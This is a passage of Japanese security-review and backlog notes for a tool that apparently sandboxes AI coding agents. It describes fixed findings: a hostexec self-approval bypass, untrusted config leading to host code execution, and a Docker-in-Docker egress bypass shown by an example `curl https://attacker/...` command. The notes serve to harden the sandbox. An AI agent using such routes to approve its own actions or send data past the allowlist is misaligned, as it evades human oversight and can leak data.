（CRITICAL-1/2, HIGH-3）あり、CRITICAL-1/2 は解決、HIGH-3 は受容。

## CRITICAL-1（✅ 解決）hostexec 自己承認バイパス
制御チャネル（approve/deny/list_pending）を別 control ソケットへ分離し、コンテナにマウントされる exec
ソケットでは `execute` 以外を状態変更前に拒否。自己承認防止の統合テスト済み。

## CRITICAL-2（✅ 解決）未信頼 repo-local config → ホスト RCE
direnv 風 workspace-trust ゲート。`.nas/` 配下ユーザ `.pkl` の内容ハッシュを `~/.config/nas/trusted.json`(0600)
に記録し **eval 前に**信頼確認。config 編集で自動失効。さらに `pkl eval` を `--allowed-modules`/
`--allowed-resources` でサンドボックス化し秘密吸い出しを遮断。

## HIGH-3（🟡 受容）Web UI 帯域外認証シークレット無し
「同一ホスト＝信頼境界」方針で受容。共有 dev サーバ/踏み台を対象にするなら再オープンが必要。
`127.0.0.1:3939` バインド + Host/Origin guard で CSRF は塞ぐが TCP loopback は UID 分離しない。
完全に塞ぐには `GET /` も帯域外トークンで gate する必要があり（Jupyter 風 URL トークン）、
「`localhost:<port>` を打つだけ」の利便性を壊すためこのトレードオフは取らない。判断は
`src/ui/security.ts` ヘッダコメントに明記済み。

## HIGH（✅ 解決）DinD egress バイパス — 設計詳細（参照）
`docker.enable` 時に `--privileged` rootless DinD サイドカーが非 internal ブリッジに接続され、
`docker -H $DOCKER_HOST run alpine curl https://attacker/...` で allowlist を迂回できた問題。

実装済みの本質修正:
1. ステージ順序を `ProxyStage → DindStage` に入替え、セッショントークンを DinD が使えるように。
2. DinD readiness 確認後に default bridge から `docker network disconnect`。
3. DinD デーモンに `HTTPS_PROXY=http://<sessionId>:<token>@nas-envoy:15001` + `NO_PROXY` を設定。
4. 非 internal な `nas-dind-<sid>` を廃止。

実機検証（2026-06-12）: 内側コンテナは egress 完全不通、デーモン pull は allowlist 内=成功/外=Forbidden。

---

# §5. OTEL / history deferred フォローアップ（裏取り後）

ADR に基づく OTLP receiver + history db + SSE 3 endpoint は実装済み。
ADR: `docs/adr/2026042901-observability-otel-history.md`。以下は 2026-07-12 に裏取りした残作業のみ。

## STILL-OPEN（未着手を確認）

- [ ] **会話履歴 / prompt content キャプチャの opt-in 化**。[検証] STILL-OPEN。現状は
  `observability.capture-content` フラグ無しで**無条件**キャプチャ（`src/agents/observability.ts:127-128,135`
  が `OTEL_LOG_USER_PROMPTS`/`OTEL_LOG_TOOL_CONTENT`/`..._CAPTURE_MESSAGE_CONTENT` を常時 inject）。
  ADR 提案の profile フラグ gating は未実装。**プライバシー観点で優先度中**。
- [ ] **実走 OTLP fixture**。[検証] STILL-OPEN。`src/history/fixtures/*.json`（7 本）は provenance 未記載
  （README/コメント無し、手書き想定）。実 Claude/Copilot fixture で置換し attribute drift 検知を早く。
- [ ] **ADR 本文の `OTEL_METRIC_EXPORT_INTERVAL` 更新**。[検証] コードは 5000ms 確定
  （`observability.ts:96`）だが ADR "Open questions"（`docs/adr/…:419-421`）が「実装時に決める」のまま stale。
  → ADR 本文を 5000ms 確定で update（コード側は対応不要）。
- [ ] **signal handler**。[検証] STILL-OPEN（意図的）。SIGINT/SIGTERM/uncaughtException で
  `recordInvocationEnd` が呼ばれず `ended_at` NULL のまま。`src/cli.ts:343-345` に「trade-off」コメントあり。
  finalizer を足すか NULL を「abrupt termination」マーカーに。
- [ ] **`recordInvocationStart` upsert 失敗時の cache eviction**。[検証] STILL-OPEN
  （`cli_lifecycle.ts:116-122` は log + return null のみ、`store.ts:107` cache は evict されない）。
  short-lived process では実害小。
- [ ] **`OtlpReceiverServiceLive.start` の bind 失敗が recoverable な契約を docstring 明示**。[検証] STILL-OPEN
  （`src/stages/observability/receiver_service.ts:1-8,38-47` に記載無し）。
- [ ] **reader handle の `busy_timeout`**。[検証] STILL-OPEN。`PRAGMA busy_timeout=5000` は `openWriter`
  （`store.ts:122`）のみ、`openReader`（`:137-153`）は無設定 → writer 長 transaction 時に即 SQLITE_BUSY。
- [ ] **`queryConversationList` の相関サブ SELECT を GROUP BY に**。[検証] STILL-OPEN（`store.ts:421-474` は
  現在 **8 本**の相関サブ SELECT）。index-backed なので perf 問題が出てから。

## DONE（裏取りで実装確認 → 削除）

- ✅ **Cost / USD 換算**: `src/ui/pricing.ts`（LiteLLM snapshot）+ frontend `ConversationCostBand`/`CostPanel`
  で view 側換算済み。
- ✅ **codex の OTEL 対応**: `agentSupportsObservability`（`observability.ts:193-200`）が codex=true、
  argv override 経由で配線済み。
- ✅ **`shouldRecordInvocation` の profile 引数 tighten**: `cli_lifecycle.ts:49-52` で narrowed 構造型に。
- ✅ **`HISTORY_SSE_EVENTS` 定数**: `src/ui/routes/history_sse_events.ts`（`HISTORY_SSE_EVENT_NAMES`）に集約。
- ✅ **`seedInvocation` helper 重複**: moot。hook→history.db 経路が schema v4（ADR 2026051501）で削除され
  `hook_writer_test.ts` ごと消滅。共有すべき対象が存在しない。
- ✅ **frontend history pages**: `HistoryListPage`/`ConversationDetailPage`/`InvocationDetailPage`/
  `HistoryShell` + `useHistoryStream` + `App.tsx` の History route/nav すべて実装済み。
